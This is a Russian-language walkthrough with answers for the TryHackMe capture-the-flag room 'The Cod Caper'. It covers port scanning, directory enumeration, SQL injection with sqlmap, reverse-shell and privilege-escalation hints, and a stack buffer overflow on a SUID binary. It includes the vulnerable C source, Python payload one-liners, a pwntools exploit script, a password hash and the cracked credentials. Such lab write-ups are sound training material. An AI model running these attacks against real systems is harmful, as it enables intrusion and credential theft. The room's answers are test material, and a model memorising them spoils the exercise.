[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [The Cod Caper](https://tryhackme.com/r/room/thecodcaper) 

Всего 11 заданий:
## Задание 1
Привет, меня зовут Пингу. Я пришел сюда, чтобы подать запрос на возврат моей рыбы! Недавно мой отец запретил мне 
есть рыбу, так как я не ел овощи. Он запер всю рыбу в сундуке и спрятал ключ на моем старом компьютере, который 
недавно переделал в сервер. Поскольку все пингвины — прирожденные эксперты в тестировании на проникновение, я решил, 
что смогу получить ключ сам! К сожалению, он забанил все IP из Антарктиды, поэтому я не могу ничего сделать с 
сервером. Поэтому я призываю тебя, мой дорогой союзник, помочь мне вернуть мою рыбу! Естественно, я буду направлять 
тебя через этот процесс.

Примечание: эта комната предполагает наличие некоторых базовых знаний по тестированию на проникновение, поскольку я 
не буду подробно описывать каждый используемый инструмент. Хотя вы можете просто использовать комнату для выполнения,
некоторый интерес или опыт в сборке настоятельно рекомендуется  

### Ответьте на вопросы ниже
Помогите мне! :)
```commandline
Ответ не нужен
```

## Задание 2
Первый шаг — посмотреть, какие порты и службы запущены на целевой машине.

Рекомендуемый инструмент - nmap:

Полезные флаги:
`-p` - Используется для указания порта для анализа, также может использоваться для указания диапазона портов, 
например-p 1-1000

`-sС` - Запускает скрипты по умолчанию на порту, что полезно для проведения базового анализа службы, работающей на 
порту.
`-А` - Агрессивный режим, приложите все усилия и постарайтесь получить как можно больше информации.
### Ответьте на вопросы ниже
Сколько портов открыто на целевой машине?
```commandline
2
```
Каков http-заголовок веб-сервера?
```commandline
Apache2 Ubuntu Default Page: It works
```
Какая версия службы ssh?
```commandline
OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
```
Какая версия веб-сервера?
```commandline
Apache/2.4.18
```

## Задание 3
Поскольку единственными работающими службами являются SSH и Apache , можно с уверенностью предположить, что сначала 
нам следует проверить веб-сервер на предмет возможных уязвимостей. Одно из первых действий — это посмотреть, какие 
страницы доступны для доступа на веб-сервере.  

Рекомендуемый инструмент: gobuster

Полезные флаги:  
`-х` - Используется для указания расширений файлов, например «php,txt,html».
`--url` - Используется для указания URL-адреса для перечисления
`--wordlist` - Используется для указания того, какой список слов добавляется к URL-адресу, т.е.

"http://url.com/word1"

"http://url.com/word2"

"http://url.com/word3.php"

Рекомендуемый список слов: big.txt

### Ответьте на вопросы ниже
Как называется важный файл на сервере?
```commandline
administrator.php
```

## Задание 4
Страница администратора, похоже, дает нам форму входа. В таких ситуациях всегда стоит проверить наличие "низко 
висящих фруктов". В случае форм входа одна из первых вещей, которую нужно проверить, — это SQL- инъекция.

Рекомендуемый инструмент: `sqlmap`

Полезные флаги:
`-u` - Указывает, какой URL-адрес следует атаковать
`--forms` - Автоматически выбирает параметры из элементов <form> на странице
`--dump` - Используется для извлечения данных из базы данных после обнаружения SQLI.
`-а` - Берет почти все из базы данных
### Ответьте на вопросы ниже
Какое имя пользователя администратора?
```commandline
pingudad
```
Какой пароль администратора?
```commandline
secretpass
```
Скольким формам SQLI подвержена данная форма?
```commandline
3
```

## Задание 5
Кажется, мы получили возможность запускать команды! Поскольку это мой старый ПК, у меня все еще должна быть учетная 
запись пользователя! Давайте запустим несколько тестовых команд, а затем попробуем получить доступ!

#### Метод 1: nc Обратная оболочка:

Эта машина оснащена nc, инструментом, который позволяет вам устанавливать и получать соединения и отправлять данные. 
Это один из самых популярных инструментов для получения обратного шелла. Некоторые отличные места, где можно найти 
полезные нагрузки обратного шелла, это `highoncoffee` и `Pentestmonkey`  

После этого вам придется провести дополнительный перебор, чтобы найти ssh-ключ pingu или скрытый пароль.

#### Метод 2: Скрытые пароли:

Если предположить, что мой отец не вносил изменений с тех пор, как забрал мой старый ПК, у меня все еще должен быть 
где-то скрытый пароль, хотя я его не помню, так что вам придется его найти! `find` — это рекомендуемый здесь инструмент,
поскольку он позволяет вам искать, какими файлами владеет конкретный пользователь.  

### Ответьте на вопросы ниже
Сколько файлов находится в текущем каталоге?
```commandline
3
```
У меня все еще есть аккаунт?
```commandline
yes
```
Какой у меня пароль SSH?
```commandline
pinguapingu
```

## Задание 6
`LinEnum` — это скрипт bash, который ищет возможные способы приватизации esc. Он невероятно популярен из-за огромного 
количества возможных методов, которые он проверяет, и часто `Linenum` — это одно из первых, что нужно попробовать, 
когда вы получаете доступ к оболочке.

#### Методы установки Linenum в систему

#### Метод 1: SCP

Поскольку у вас есть доступ ssh к машине, вы можете использовать SCP для копирования файлов. В случае Linenum вы бы 
запустили  поместили LinEnum в /tmp.scp {path to linenum} {user}@{host}:{path}. 

Example: 
```commandline
scp /opt/LinEnum.sh  pingu@10.10.10.10:/tmp  

```

#### Метод 2: SimpleHTTPServer

`SimpleHTTPServer` — это модуль, который размещает базовый веб-сервер на вашей хост-машине. Предполагая, что 
взломанная вами машина имеет возможность удаленно загружать файлы, вы можете разместить LinEnum и загрузить его. 

Примечание: существует множество способов сделать это, и два из перечисленных выше — мои любимые.

После установки LinEnum в систему вам останется только запустить его и посмотреть на вывод, показанный выше, после 
завершения работы. 

### Ответьте на вопросы ниже
Какой интересный путь у интересного suid-файла?
```commandline
/opt/secret/root
```

## Задание 7
К счастью для нас, мне удалось раздобыть копию исходного кода с флешки моего отца.
```commandline
#include "unistd.h"
#include "stdio.h"
#include "stdlib.h"
void shell(){
setuid(1000);
setgid(1000);
system("cat /var/backups/shadow.bak");
}

void get_input(){
char buffer[32];
scanf("%s",buffer);
}

int main(){
get_input();
}
```

Файл SUID, похоже, ожидает 32 символа ввода, а затем немедленно завершается. Похоже, это требует дальнейшего 
расследования. К счастью, я практиковал бинарную эксплуатацию, когда использовал этот ПК, поэтому у меня есть 
предустановленные инструменты для проверки. Одним из таких инструментов является pwndbg, плагин для GDB, который 
позволяет вам лучше проверять двоичные файлы.

Запустите `gdb /opt/secret/root` и вы увидите экран, похожий на этот


Это означает, что pwndbg успешно инициализирован. Следующий шаг — проверить, происходит ли что-нибудь при отправке 
более 32 символов. Чтобы сделать это r < <(cyclic 50), введите команду, которая запускает программу и предоставляет 
50 символов «циклического» ввода.  

Циклический ввод выглядит примерно так: «aaaaaaaabaaacaaadaaaeaaaf» и т. д. Поскольку он находится в этом 
«циклическом» формате, он позволяет нам лучше понять контроль, который мы имеем над определенными регистрами, по 
причинам, которые вы сейчас увидите.  

После запуска этой команды вы должны увидеть что-то похожее на этот экран



Вот тут-то и пригодятся некоторые знания ассемблера. Кажется, в этом случае мы можем перезаписать EIP, который 
известен как указатель инструкций. Указатель инструкций сообщает программе, какой бит памяти выполнять следующим, 
что в идеальном случае заставило бы программу работать нормально. Однако, поскольку мы можем перезаписать его, мы 
теоретически можем выполнить любую часть программы в любое время.

Вспомните функцию оболочки из исходного кода, если мы можем перезаписать EIP, чтобы указать на функцию оболочки, мы 
можем заставить ее выполниться. Здесь также проявляются преимущества циклического ввода. Вспомните, что циклический 
ввод идет последовательностями из 4 символов/байтов, то есть мы можем точно рассчитать, сколько символов нам нужно 
предоставить, прежде чем мы сможем перезаписать EIP.

К счастью, cyclic предоставляет эту функциональность с помощью флага -l. Запуск `cyclic -l` {адрес ошибки} точно 
скажет нам, сколько символов нам нужно предоставить, чтобы перезаписать EIP.

Выполнение `cyclic -l 0x6161616c` выводит 44 символа, то есть мы можем перезаписать EIP, как только предоставим 44 
символа входных данных. 

Это все, что нам было нужно для предэксплуатационной подготовки!

### Ответьте на вопросы ниже
Прочитайте выше :)
```commandline
Ответ не нужен
```

## Задание 8
Ранее мы выяснили, что нам нужно предоставить 44 символа ввода, а затем мы можем выполнить любую часть программы, 
которую мы хотим. Теперь следующим шагом будет выяснить, где именно находится функция оболочки в памяти, чтобы мы 
знали, что устанавливать в EIP. GDB также поддерживает это с помощью команды disassemble. Введите disassemble shell, 
и это должно появиться.   


Нас интересуют шестнадцатеричные адреса памяти. Итак, из того, что мы знаем, нам нужно всего лишь предоставить 44 
символа, а затем "0x080484cb", и функция оболочки должна выполниться, давайте попробуем! 

Примечание: Современные архитектуры ЦП имеют "little endian", что означает, что байты идут в обратном порядке. 
Например, "0x080484cb" станет "cb840408" 

Для этого мы можем использовать Python, так как он предоставляет удобный способ преобразования.

#### Метод 1 — Ручное преобразование:

`python -c 'print "A"*44 + "\xcb\x84\x04\x08"'` выведет нужную нам полезную нагрузку, но ее нужно будет вручную 
преобразовать в little endian

#### Метод 2 — Структура:
`python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'`

Для этого требуется импортировать модуль, но struct.pack позволяет нам автоматически преобразовывать память в формат 
`little endian`. 

Мы печатаем 44 случайных символа (в данном случае A), а затем наш адрес памяти в порядке от младшего к старшему, и 
оболочка должна выполниться. Это можно проверить, передав вывод в двоичный файл 

`python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root` должен предоставить вам этот вывод.

Мы сделали это!

### Ответьте на вопросы ниже
Ура!
```commandline
Ответ не нужен
```

## Задание 9
Pwntools — это библиотека Python, призванная сделать все, что мы только что сделали в последней задаче, намного 
проще. Однако, поскольку это библиотека, для ее полного использования требуются знания Python, и поэтому все в этой 
задаче будет сделано с использованием скрипта Python.  

Начнем сценарий так:
```commandline
from pwn import *
proc = process('/opt/secret/root')
```

Это импортирует все утилиты из библиотеки pwntools, чтобы мы могли использовать их в нашем скрипте, а затем создает 
процесс, с которым мы можем взаимодействовать с помощью функций pwntools. 

Мы знаем, что нам нужен адрес памяти функции оболочки, и pwntools предоставляет способ получить его с помощью ELF().

ELF позволяет нам получать различные адреса памяти важных точек в нашем двоичном файле, включая адрес памяти функции 
оболочки. 

С добавлением ELF наш скрипт становится

```commandline
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
```

shell_func содержит адрес памяти нашей функции оболочки. Теперь нам нужен способ формирования полезной нагрузки, к 
счастью, pwntools имеет это с fit(). 

fit позволяет нам формировать полезную нагрузку, комбинируя символы и наш адрес памяти. Чтобы отправить полезную 
нагрузку, мы можем использовать метод в нашей proc переменной proc.sendline(), который просто отправляет любые данные,
которые мы хотим, в двоичный файл. Наконец, мы можем использовать proc.interactive(), чтобы просмотреть полный вывод 
процесса.   

При всем этом наш окончательный сценарий эксплойта становится
```commandline
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

Сохраните это в файле .py и запустите его. Вы должны получить следующий вывод:

Мы сделали это снова!

### Ответьте на вопросы ниже
Еще больше ууууу!
```commandline
Ответ не нужен
```

## Задание 10
Теперь, когда у нас есть хэши паролей, мы можем взломать их и получить пароль root! Вспомним из предыдущих выводов, 
что наш хэш пароля root — это " $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.". 

К счастью, hashcat поддерживает взлом хэшей паролей Linux. Вы можете найти список режимов hashcat здесь и rockyou.
txt (популярный список слов) здесь (если у вас его еще нет в системе) 

Рекомендуемый инструмент - `Hashcat`:

Использование:
`hashcat {flags} {hashfile} {wordlist}`

Полезные флаги:

`-а` - Укажите режим атаки, режимы атаки можно найти на странице руководства.
`-m` - Указывает, какой режим использовать, см. список режимов.


### Ответьте на вопросы ниже
Какой пароль root?
```commandline
love2fish
```
## Задание 11
Теперь, когда у меня есть пароль root, я могу получить любую рыбу, которую он попытается от меня спрятать :).

Дальнейшее чтение:

http://docs.pwntools.com/en/stable/

https://browserpwndbg.readthedocs.io/en/docs/

### Ответьте на вопросы ниже
Вы мне помогли!
```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)